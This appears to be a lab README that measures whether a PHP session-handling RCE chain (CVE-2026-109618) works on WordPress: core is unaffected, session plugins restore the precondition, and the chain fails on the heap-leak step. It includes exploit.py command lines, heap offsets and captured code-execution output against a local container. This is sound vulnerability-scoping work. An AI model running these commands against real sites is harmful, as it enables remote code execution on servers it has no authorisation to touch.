# Does WordPress actually have this problem?

**Measured, not assumed.** Three results, all from the same container:

| Target | PHPSESSID? | Chain |
|---|---|---|
| WordPress core (`/`) | no | cannot start |
| WordPress + session plugin (`/index.php`) | yes | **fails at B1** |
| minimal `session_start()` page (`/p2s.php`) | yes | **RCE: `uid=33(www-data)`** |

The third row is the control that makes the second row meaningful.

---

## 1. WordPress core is not affected

The chain's first step is an OOM during request startup that leaves `PS(id)`
dangling. `PS(id)` only exists when a session has been started.

WordPress authenticates with its own HMAC'd cookies:

```
wordpress_logged_in_<hash>
wordpress_sec_<hash>
wp-postpass_<hash>
```

No `PHPSESSID`, no `$_SESSION`, no session file. Measured:

```
PASS A - control (session plugin OFF)
  [+] no PHPSESSID - WP core does not start a session
  [+] upload_progress produced no session - attack vector absent
```

With no session, the OOM has nothing to leave dangling. The chain has no first
step.

## 2. A session plugin restores the precondition

```php
add_action('init', function () { session_start(); });
```

That is enough to bring `PHPSESSID` back:

```
PASS B - session plugin ON
  [+] PHPSESSID present: Set-Cookie: PHPSESSID=45cbf097...
  [+] upload_progress writes into a session: Set-Cookie: PHPSESSID=aa69d3d7...
```

Both checks matter and they are different:

1. `PHPSESSID` on a plain GET — a session exists
2. `PHPSESSID` on a 1 KB upload-progress POST — PHP writes progress into that
   session **during parsing**, which is the actual primitive

So the affected *configuration* exists in the WordPress world. Plugins do call
`session_start()` for carts, wizards, multi-step forms and captcha state.

## 3. The chain still fails on WordPress, and the reason is the heap

`/index.php` on the WordPress site:

```
A1: END-cleanup send_cookie OOM
    -> HTTP 500                       <- OOM works, worker survives
B1: stale-id OOB read (ASLR bypass)
    leak failed: no Set-Cookie in leak response (0 bytes)
```

A1 behaves correctly: OOM, worker count stays at 2, no segfault. The failure is
B1.

The control, same container, same PHP, same ini:

```bash
docker cp www/p2s.php p2s-wp:/var/www/html/p2s.php
python3 ../../exploit.py -t http://127.0.0.1:18120/p2s.php --cmd 'id' \
    --save /out/WPMIN --force
```

```
[+] chain completed on try 1 candidate 1
[OUTPUT] uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

So PHP in that container is fine, the ini is fine, the offsets are fine, and
the worker survives. The only difference between working and failing is
**what the script does before the session is touched**.

### Why WordPress breaks it

`p2s.php` is three lines: `session_start()`, touch `$_SESSION`, echo. The heap
at the moment of the OOM is essentially empty, which is what the chain's
grooming assumes.

WordPress `index.php` boots the whole framework first: `wp-load.php` →
`wp-settings.php` → autoloader → `$wpdb` connection → options cache →
`WP_Query` for the main loop. Thousands of allocations before the plugin's
`init` hook ever calls `session_start()`.

B1's leak depends on a precise ZendMM bin layout: it plants a fake
`zend_string` header at `chunk + page*0x1000 - 0x1018` and expects `PS(id)` to
be dangling at `chunk + 0x1018`. WordPress's bootstrap moves every one of those
addresses.

This is a **heap calibration** failure, not a missing precondition. The chain
is calibrated for a minimal entry script.

---

## What this means in practice

| Statement | True? |
|---|---|
| "WordPress core is vulnerable to CVE-2026-109618" | **No** — no PHP session |
| "A WordPress site with a session-using plugin is in the affected configuration" | **Yes** — measured |
| "This chain gets RCE on WordPress" | **No** — fails at B1 |
| "PHP 8.4.26 + this chain works in the WordPress container" | **Yes** — `/p2s.php` |

For a real WordPress target, the honest report is: the attack vector exists if
a plugin starts a session, but completing the chain needs per-target heap
calibration that this tool does not do.

---

## Files

| File | Purpose |
|---|---|
| `Dockerfile` | `php:8.4.26-apache` + WP core + wp-cli |
| `php.ini` | the chain's required ini values |
| `apache.conf` | single-worker prefork |
| `wp-config.php` | env-driven DB config, WP cron disabled |
| `entrypoint.sh` | wait for DB, `wp core install` if needed, start Apache |
| `lab_wordpress.sh` | up / status / seed / down / nuke, no compose needed |
| `test_wordpress.sh` | the two-pass session measurement |
| `cmp_a1.sh` | A1 in isolation: status, worker survival, session files |
| `diag_wp.sh` | ini values, worker state, php errors, session files |
| `export_sql.sh` | dump the install into `sql/wordpress-seed.sql` |
| `sql/wordpress-seed.sql` | 107 KB, 12 tables, ready to mount |
| `plugins/p2s-session-on` | calls `session_start()` on `init` |
| `plugins/p2s-session-off` | control, identical to stock WP |
| `www/p2s.php` | minimal session page, the heap control |

## Running it

```bash
sudo ./lab_wordpress.sh up        # builds once, starts db + wordpress
sudo ./test_wordpress.sh          # two-pass session measurement
sudo ./cmp_a1.sh                  # A1 in isolation
```

Then the two chain runs:

```bash
cd ../..
python3 exploit.py -t http://127.0.0.1:18120/index.php --cmd 'id' \
    --save /out/wp --force            # fails at B1 (WordPress bootstrap)
python3 exploit.py -t http://127.0.0.1:18120/p2s.php --cmd 'id' \
    --save /out/wpmin --force         # succeeds (minimal script)
```

---

## Honest limitations

- This proves the **precondition**, not that a specific plugin in the wild does
  this. Finding one means auditing that plugin.
- A site with `session.upload_progress=Off` stays safe even with a session
  plugin, because nothing is written during parsing.
- A site behind PHP-FPM is out of scope for this chain regardless of sessions.
- The measurement uses one request; a plugin that only starts a session on
  `/checkout` needs that path tested instead of `/`.
- Making the chain work on WordPress would need heap grooming calibrated
  against WordPress's own allocation profile — a different piece of work.
